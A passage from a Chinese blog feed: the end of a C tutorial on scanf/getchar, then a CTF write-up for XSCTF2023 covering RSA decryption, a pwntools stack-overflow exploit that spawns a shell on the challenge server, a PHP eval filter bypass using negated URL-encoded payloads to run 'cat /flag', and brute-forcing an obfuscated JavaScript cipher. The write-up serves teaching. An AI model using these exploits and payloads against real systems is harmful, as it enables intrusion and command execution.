src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231018161942008.png" alt="image-20231018161942008" style="zoom:50%;" /><h3 id="注意">注意</h3><p>1.不要在scanf中使用<code>'\n',' '</code>等空白字符来结尾,例如:</p><p><code>scanf(&quot;%d%d%d &quot;, &amp;i, &amp;j, &amp;k);</code></p><p><code>scanf(&quot;%d%d%d\n&quot;, &amp;i, &amp;j, &amp;k);</code></p><p>因为不同于printf,scanf函数的空白符代表忽略(匹配并丢弃)任意数量的空白字符,如果放在结尾,意味着这个scanf无法使用换行来结束输入!</p><p>2.(个人的建议)scanf中尽量只使用格式指示符,不要使用其他普通字符,做到简化输入.</p><h2 id="getchar-函数">getchar()函数</h2><p>函数原型为:</p><p><code>int getchar( void );</code></p><p>该函数非常简单,用于读取一个字符:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> c = getchar();</span><br></pre></td></tr></table></figure><p>上面的代码和下面的代码等价:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> c</span><br><span class="line"><span class="title function_">scanf</span><span class="params">(<span class="string">&quot;%c&quot;</span>,&amp;c)</span>;</span><br></pre></td></tr></table></figure><h2 id="putchar-函数">putchar()函数</h2><p>函数原型为:</p><p><code>int putchar( int ch );</code></p><p>很简单,<code>putchar('a');</code>就可以将一个字符<code>a</code>输出.</p><h2 id="其他-待扩充">其他(待扩充)</h2><p>puts()和gets()将在讲解字符串时展开.</p><br><p>本章讲解了最常用的几个输入输出函数的使用,到现在我们多少掌握了printf和scanf的写法,需要在练习中不断熟悉.由于比较简单,可能例子不多.</p><p>自己多查资料.</p><br><br><p>上一篇:<a href="../2023-09-20-949602bbfb8e/">c语言教程-3_1-数据类型</a></p><p>下一篇:<a href="../2023-09-23-7bb78790d38b/">c语言教程-4-表达式和语句</a></p>]]></content>
      
      
      <categories>
          
          <category> C语言教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WriteUp-XSCTF2023初赛</title>
      <link href="/2023-10-16-f369fd533e40/"/>
      <url>/2023-10-16-f369fd533e40/</url>
      
        <content type="html"><![CDATA[<h1 id="crypto">Crypto</h1><h2 id="题目1-easy-rsa">题目1-easy rsa</h2><p>使用Mathematica数学软件进行方程求解,并筛选出可行解:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/9106898458e3d70d267173fd2756f01f.png" alt="9106898458e3d70d267173fd2756f01f" style="zoom:50%;" /><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p:<span class="number">108021842791966417195317937419622020751339914135950392876631389717196303328745122288829568682158007893687475477612171957153023357929933447215358491430114529821247279180738397413290888437255798414771375647208657248398369739278975678290946624554583579122528493521171797723794930492274778459375087426951672521659</span></span><br><span class="line">q:<span class="number">324491213103511937485837573235633</span></span><br></pre></td></tr></table></figure><p>然后使用RSA解密脚本即可解出明文,然后使用binascii转换为字符串即为flag:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 解密脚本</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知公私钥</span></span><br><span class="line">n = <span class="number">35052138809242039609159777275278725458541473751415176437175001503318881522064795786652691106400353446906298757235241396135707610647382094619828643125184505053687643676993728127835906272771669307861545438892003557176894101050915782630518417655550515213032626941985080617066204665902221073674346788849832690541665755364542885371501944903075147</span></span><br><span class="line">p = <span class="number">108021842791966417195317937419622020751339914135950392876631389717196303328745122288829568682158007893687475477612171957153023357929933447215358491430114529821247279180738397413290888437255798414771375647208657248398369739278975678290946624554583579122528493521171797723794930492274778459375087426951672521659</span></span><br><span class="line">q = <span class="number">324491213103511937485837573235633</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">32126229895829557420173865487224534062896536751420648497526558901007585083150645063005523675709156042236671834263167769107980622024877911701227453158527711350179148603688096479478647852766951147766763992546472396482472628206738548210314398445021525173762355241909294762807202290826656663671253691179492384064106540693719798019256938412073334</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># c = input(&#x27;请输入密文&#x27;)</span></span><br><span class="line"><span class="comment"># n = p * q</span></span><br><span class="line">phi_n = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)  <span class="comment"># 对n取欧拉函数,p,q均为素数</span></span><br><span class="line">d = gmpy2.invert(e, phi_n)  <span class="comment"># 即e*d mod phi_n = 1 (求逆元)</span></span><br><span class="line">m = gmpy2.powmod(c, d, n)  <span class="comment"># 即m = c^d mod n (求大整数c的d次幂模n取余)</span></span><br><span class="line"><span class="comment"># print(m)  # 求得的明文</span></span><br><span class="line">flag = <span class="built_in">str</span>(<span class="built_in">hex</span>(m))[<span class="number">2</span>:]</span><br><span class="line"><span class="comment"># print(flag)</span></span><br><span class="line"><span class="built_in">print</span>(binascii.unhexlify(flag).decode())</span><br></pre></td></tr></table></figure><p><code>XSCTF&#123;Crypto_is_easyyyyyyyyyyyyyyyyyyyyy:D&#125;</code></p><h1 id="pwn">Pwn</h1><h2 id="题目1-babystack">题目1-babystack</h2><p>本题用IDA分析可以看到有一个整数溢出,解决该溢出后会有buf的栈溢出,需要先解决整数溢出:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016142008727.png" alt="image-20231016142008727" style="zoom:50%;" /><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016142818260.png" alt="image-20231016142818260" style="zoom:33%;" /></p><p>scanf中使用%4d来输入,意味着我们可以输入负数,这样对v4进行uint16_t的解释时就会出现回绕(带模加法形成一个阿贝尔群?—&gt;见csapp)</p><p>uint16_t向uint32_t进行隐式转换(其实不重要?),2147483646转32位二进制为</p><p>​<code>01111111 11111111 11111111 11111110</code></p><p>想办法使用负数回绕即可(带模加法形成一个阿贝尔群?—&gt;见csapp),我这里学的不是很扎实,我选择写程序:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int16_t</span> a=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="type">uint32_t</span> b=a;</span><br><span class="line">        <span class="keyword">if</span>(b&gt;<span class="number">2147483646</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d   %d    %hu   %#x\n&quot;</span>,a,b,a,b);</span><br><span class="line">        <span class="keyword">if</span>(++a==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>实际上就是scanf输入后,无论怎么解释,二进制位不变,C语言中进行uint16_t向uint32_t转换时,貌似会将最高位的符号位进行扩展?(linux的x64),总之写代码就可以找出一系列数:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016143653985.png" alt="image-20231016143653985" style="zoom:50%;" /><p>继续查找函数发现有backdoor()函数可以直接getshell:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016143806992.png" alt="image-20231016143806992" style="zoom:50%;" /><p>直接编写exp:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;43.248.97.200&#x27;</span>, <span class="number">40054</span>)</span><br><span class="line"><span class="meta"># p = process(<span class="string">&#x27;./babystack&#x27;</span>)</span></span><br><span class="line"><span class="meta"># p=gdb.debug(<span class="string">&#x27;./babystack&#x27;</span>,<span class="string">&#x27;break main&#x27;</span>)</span></span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x000000004013d3</span></span><br><span class="line">sys = <span class="number">0x4010C0</span></span><br><span class="line">binsh = <span class="number">0x40209F</span></span><br><span class="line"><span class="meta"># backdoor = 0x4012B7</span></span><br><span class="line">backdoor = <span class="number">0x4012BC</span></span><br><span class="line"># 并不是首地址,跳过了push ebp来栈平衡</span><br><span class="line"><span class="meta"># https:<span class="comment">//zhuanlan.zhihu.com/p/415492654</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#payload = b<span class="string">&#x27;a&#x27;</span> * 0x58 + p64(pop_rdi_ret) + p64(binsh) +p64(1)+ p64(sys)</span></span><br><span class="line">payload = b<span class="number">&#x27;</span>a<span class="number">&#x27;</span> * <span class="number">0x59</span> + p64(backdoor)</span><br><span class="line"># 多输入一个字节才行,原因未知,fastcall的backdoor函数没道理啊?</span><br><span class="line">num = <span class="string">&#x27;-156&#x27;</span></span><br><span class="line">p.send(num)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>此时遇到了栈平衡的问题,也是这题学到的知识点,终于多少弄明白了.</p><p>还有一个问题就是,不知为何溢出覆盖时少了一个字节,最后多加了一个字节才成功.</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016144119757.png" alt="image-20231016144119757" style="zoom:50%;" /><p><code>XSCTF&#123;E49AA5B5-B7DA-769B-4AE7-F40A17E09A04&#125;</code></p><h1 id="web">Web</h1><h2 id="题目1-eval-eval-我的">题目1-eval_eval_我的</h2><p>打开一看就是eval命令执行,同时有正则检查:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016144446446.png" alt="image-20231016144446446" style="zoom:50%;" /><p>先看后两个,是md5强碰撞绕过,直接传入两个数组即可—如果是数组,那么md5()不仅不会报错,还会返回null,这就绕过了md5().</p><p>再看正则,我们预想的是使用system()函数去执行linux命令,但是有正则过滤,这里使用urlencode+取反进行绕过:</p><p>这里的函数执行格式为(func)();</p><p>所以我们使用php函数分别对函数和参数进行url编码取反</p><p>使用在线php网站:</p><p><a href="https://www.bejson.com/runcode/php/">https://www.bejson.com/runcode/php/</a></p><p>依次运行两行命令:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//echo urlencode(~&#x27;system&#x27;);</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="string">&#x27;cat /flag&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分别获得结果:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">8</span>C%<span class="number">86</span>%<span class="number">8</span>C%<span class="number">8B</span>%<span class="number">9</span>A%<span class="number">92</span></span><br><span class="line">和</span><br><span class="line">%<span class="number">9</span>C%<span class="number">9</span>E%<span class="number">8B</span>%DF%D0%<span class="number">99</span>%<span class="number">93</span>%<span class="number">9</span>E%<span class="number">98</span></span><br></pre></td></tr></table></figure><p>这样payload就分析好了:</p><p>get方法为<code>?xsctf=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%9E%98);</code></p><p>post方法为<code>Xp0int[]=1&amp;Sloth[]=2</code></p><p>使用谷歌浏览器的hackbar插件:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016145100970.png" alt="image-20231016145100970" style="zoom:50%;" /><p>结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016145119519.png" alt="image-20231016145119519" style="zoom:50%;" /><p><code>XSCTF&#123;YoU_F1NalLy_EvaLLL_m3!!&#125;</code></p><h1 id="reverse">Reverse</h1><h2 id="题目1-jsnewnew">题目1-JSNEWNEW</h2><p>这个题我最后也没分析出来_H4H4H4和_H4H4H4H4两个函数的原理…</p><p><s>但是我会暴力</s></p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016145413986.png" alt="image-20231016145413986" style="zoom:50%;" /><p>我们可以进行如下测试:</p><p>首先对_H4H4H4()进行分析:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">_Y0u</span>(<span class="params">_0x5093c8, _0x291ad5</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> _0x5093c8 + _0x291ad5</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">_C4n</span>(<span class="params">_0x4277b8</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> _0x4277b8 &amp; <span class="number">0xff</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">_N3v3r</span>(<span class="params">_0x414184, _0x29df09</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">_C4n</span>(_0x414184 ^ _0x29df09)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">_G37</span>(<span class="params">_0x500f65, _0x1ddb85</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">_C4n</span>(_0x500f65 | _0x1ddb85)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">_Th15</span>(<span class="params">_0x1621d6, _0x285fc7</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">_C4n</span>(_0x1621d6 &amp; _0x285fc7)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">_H4</span>(<span class="params">_0x2abb65</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">_C4n</span>(~_0x2abb65)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">_H4H4</span>(<span class="params">_0x5b22bc</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">_C4n</span>(<span class="title function_">_H4H4H4</span>(<span class="title function_">_H4</span>(_0x5b22bc), <span class="title function_">_H4H4H4</span>([], <span class="number">0x1</span>)))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">_H4H4H4</span>(<span class="params">_0x431cb1, _0x516603</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">_C4n</span>((<span class="title function_">_H4</span>(<span class="title function_">_G37</span>(<span class="title function_">_H4</span>(<span class="title function_">_Y0u</span>(_0x431cb1, _0x516603)), <span class="title function_">_H4</span>(<span class="title function_">_Y0u</span>(_0x431cb1, _0x516603)))), <span class="title function_">_H4</span>(<span class="title function_">_G37</span>(<span class="title function_">_H4</span>(<span class="title function_">_Y0u</span>(_0x431cb1, _0x516603)), <span class="title function_">_H4</span>(<span class="title function_">_Y0u</span>(_0x431cb1, _0x516603))))))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">_H4H4H4H4</span>(<span class="params">_0x1b81b8, _0x11e8ab, _0x2c730f</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> a = <span class="title function_">_H4H4H4</span>(_0x1b81b8, _0x2c730f), a = <span class="title function_">_H4H4H4</span>(a, <span class="title function_">_H4H4</span>(_0x11e8ab)), a = <span class="title function_">_H4H4H4</span>(a, <span class="title function_">_H4H4</span>(_0x2c730f)), <span class="title function_">_C4n</span>(a)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;_H4H4H4&quot;</span>)</span><br><span class="line">num = <span class="title function_">_H4H4H4</span>(<span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(num) <span class="comment">// 2</span></span><br><span class="line">num = <span class="title function_">_H4H4H4</span>(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(num) <span class="comment">// 1</span></span><br><span class="line">num = <span class="title function_">_H4H4H4</span>(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(num) <span class="comment">// 1</span></span><br><span class="line">num = <span class="title function_">_H4H4H4</span>(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(num) <span class="comment">// 0</span></span><br><span class="line"></span><br><span class="line">num = <span class="title function_">_H4H4H4</span>(<span class="number">3</span>, <span class="number">3</span>) <span class="comment">// 011 011</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(num) <span class="comment">// 6</span></span><br><span class="line">num = <span class="title function_">_H4H4H4</span>(<span class="number">3</span>, <span class="number">0</span>) <span class="comment">// 011 000</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(num) <span class="comment">// 3</span></span><br><span class="line">num = <span class="title function_">_H4H4H4</span>(<span class="number">0</span>, <span class="number">3</span>) <span class="comment">// 000 011</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(num) <span class="comment">// 3</span></span><br><span class="line">num = <span class="title function_">_H4H4H4</span>(<span class="number">3</span>, <span class="number">2</span>) <span class="comment">// 011 010</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(num) <span class="comment">// 5</span></span><br><span class="line"></span><br><span class="line">num = <span class="title function_">_H4H4H4</span>(<span class="number">18</span>, <span class="number">3</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(num) <span class="comment">// 21</span></span><br><span class="line">num = <span class="title function_">_H4H4H4</span>(<span class="number">21</span>, <span class="number">56</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(num) <span class="comment">// 77</span></span><br><span class="line">num = <span class="title function_">_H4H4H4</span>(<span class="number">6</span>, <span class="number">7</span>) </span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(num) <span class="comment">// 13</span></span><br><span class="line">num = <span class="title function_">_H4H4H4</span>(<span class="number">19</span>, <span class="number">2</span>) <span class="comment">// 011 010</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(num) <span class="comment">// 21</span></span><br></pre></td></tr></table></figure><p><code>根据结果进行推测,发现实际上_H4H4H4(a,b)就是(a+b)</code></p><p>再看_H4H4H4H4(a,b,c),这里发现c是一个随机数,我们尝试先固定c,对a,b进行爆破:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">console.<span class="built_in">log</span>(<span class="string">&quot;_H4H4H4H4&quot;</span>)</span><br><span class="line">rand_num = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span>(var a=<span class="number">0</span>;a&lt;<span class="number">128</span>;a+=<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span>(var b=<span class="number">0</span>;b&lt;<span class="number">128</span>;b+=<span class="number">1</span>)&#123;</span><br><span class="line">        console.<span class="built_in">log</span>(_H4H4H4H4(a, b, rand_num))</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016150055629.png" alt="image-20231016150055629" style="zoom:50%;" /><p>其实多此一举,明文不同,从加密的角度,结果当然不同,我们尝试a,b固定(或者变化范围很小),对c爆破:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">console.<span class="built_in">log</span>(<span class="string">&quot;_H4H4H4H4&quot;</span>)</span><br><span class="line">globala = <span class="number">12</span></span><br><span class="line">globalb = <span class="number">45</span></span><br><span class="line"><span class="keyword">for</span>(var c=<span class="number">0</span>;c&lt;=<span class="number">100</span>;c+=<span class="number">1</span>)&#123;</span><br><span class="line">    console.<span class="built_in">log</span>(_H4H4H4H4(globala, globalb, c))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016150615926.png" alt="image-20231016150615926" style="zoom:50%;" /><p>多切换几个globala和globalb,发现在这两个值相同的情况下,随机的c对结果没有任何影响,所以我们大胆猜测这个加密不需要随机数(其实显然加密不能完全随机(?))</p><p>这样,尽管我们分析不出来这两个函数,但是通过&quot;爆破&quot;我们可以推测出其功能,我们无需化简,只需要把那一堆函数放在一起即可.</p><p>接下来,我们就根据加密的过程进行flag的爆破(代码分析略):</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">function _Y0u(_0x5093c8, _0x291ad5) &#123;</span><br><span class="line">    <span class="keyword">return</span> _0x5093c8 + _0x291ad5</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function _C4n(_0x4277b8) &#123;</span><br><span class="line">    <span class="keyword">return</span> _0x4277b8 &amp; <span class="number">0xff</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function _N3v3r(_0x414184, _0x29df09) &#123;</span><br><span class="line">    <span class="keyword">return</span> _C4n(_0x414184 ^ _0x29df09)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function _G37(_0x500f65, _0x1ddb85) &#123;</span><br><span class="line">    <span class="keyword">return</span> _C4n(_0x500f65 | _0x1ddb85)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function _Th15(_0x1621d6, _0x285fc7) &#123;</span><br><span class="line">    <span class="keyword">return</span> _C4n(_0x1621d6 &amp; _0x285fc7)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function _H4(_0x2abb65) &#123;</span><br><span class="line">    <span class="keyword">return</span> _C4n(~_0x2abb65)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function _H4H4(_0x5b22bc) &#123;</span><br><span class="line">    <span class="keyword">return</span> _C4n(_H4H4H4(_H4(_0x5b22bc), _H4H4H4([], <span class="number">0x1</span>)))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function _H4H4H4(_0x431cb1, _0x516603) &#123;</span><br><span class="line">    <span class="keyword">return</span> _C4n((_H4(_G37(_H4(_Y0u(_0x431cb1, _0x516603)), _H4(_Y0u(_0x431cb1, _0x516603)))), _H4(_G37(_H4(_Y0u(_0x431cb1, _0x516603)), _H4(_Y0u(_0x431cb1, _0x516603))))))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function _H4H4H4H4(_0x1b81b8, _0x11e8ab, _0x2c730f) &#123;</span><br><span class="line">    <span class="keyword">return</span> a = _H4H4H4(_0x1b81b8, _0x2c730f), a = _H4H4H4(a, _H4H4(_0x11e8ab)), a = _H4H4H4(a, _H4H4(_0x2c730f)), _C4n(a)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">enc = [<span class="number">0x55</span>, <span class="number">0xbf</span>, <span class="number">0x63</span>, <span class="number">0xbc</span>, <span class="number">0x33</span>, <span class="number">0x95</span>, <span class="number">0x31</span>, <span class="number">0x4c</span>, <span class="number">0x89</span>, <span class="number">0x6b</span>, <span class="number">0x49</span>, <span class="number">0x31</span>, <span class="number">0x30</span>, <span class="number">0xdf</span>, <span class="number">0x63</span>, <span class="number">0xe5</span>, <span class="number">0x57</span>, <span class="number">0xd7</span>, <span class="number">0x73</span>, <span class="number">0xa6</span>, <span class="number">0x6e</span>, <span class="number">0xd3</span>, <span class="number">0x63</span>, <span class="number">0xa1</span>, <span class="number">0x92</span>, <span class="number">0x5b</span>, <span class="number">0x72</span>, <span class="number">0xe6</span>, <span class="number">0x8f</span>, <span class="number">0x76</span>, <span class="number">0x4f</span>, <span class="number">0xd0</span>]</span><br><span class="line">key = <span class="string">&#x27;Hur1k&#x27;</span></span><br><span class="line"></span><br><span class="line">rand_n = <span class="number">1</span></span><br><span class="line">temp1 = <span class="number">0</span></span><br><span class="line">temp2 = <span class="number">0</span></span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> (var i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i += <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (var c = <span class="number">0</span>; c &lt; <span class="number">128</span>; c += <span class="number">1</span>) &#123;</span><br><span class="line">        temp1 = (c + i) ^ i</span><br><span class="line">        <span class="keyword">if</span>(enc[i] == temp1)&#123;</span><br><span class="line">            flag[<span class="string">&#x27;push&#x27;</span>](c)</span><br><span class="line">            <span 